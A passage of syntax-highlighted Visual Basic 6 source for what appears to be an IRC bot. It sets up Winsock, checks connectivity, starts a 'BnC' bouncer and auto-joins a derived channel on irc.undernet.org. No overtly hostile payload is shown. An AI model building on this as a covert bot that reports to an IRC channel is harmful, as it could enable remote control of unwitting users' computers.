class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"SetWindowLongA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nIndex</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwNewLong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bSock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lSock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cSock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sSock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rCh</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cNick</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cUser</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BnC</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">StartWinsock</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
</span><span class="sc7">StartWinsock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">WSAStartup</span><span class="sc6">(</span><span class="sc2">&amp;H101</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ConectBot</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Hook</span><span class="sc6">(</span><span class="sc7">Form1.hwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">StartWinsock</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">iStat</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">BnC</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">StartBnC</span><span class="sc0">
</span><span class="sc7">bSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc4">"irc.undernet.org"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Form1.hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6667</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1025</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">bSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GNU</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GSU</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc0">
</span><span class="sc7">rCh</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">GNU</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"JOIN #"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rCh</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TOPIC #"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rCh</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" IREUL"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">getHost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc0">

</span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">getHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">getHost.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">getHost.h_length</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
    </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0">
  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc7">GetHostByNameAlias</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">

</span><span class="sc7">sockin.sin_family</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AF_INET</span><span class="sc0">
</span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc6">(</span><span class="sc7">Port</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc7">Host</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc6">(</span><span class="sc7">AF_INET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

 </span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
 
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">SockNum</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc0">
 </span><span class="sc7">Linger.l_onoff</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc0">
 </span><span class="sc7">Linger.l_linger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
        
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vMessage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
            </span><span class="sc7">TheMsg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">vMessage</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbFromUnicode</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">SendData</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">LBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">iStat</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">iStat</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">InternetGetConnectedState</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

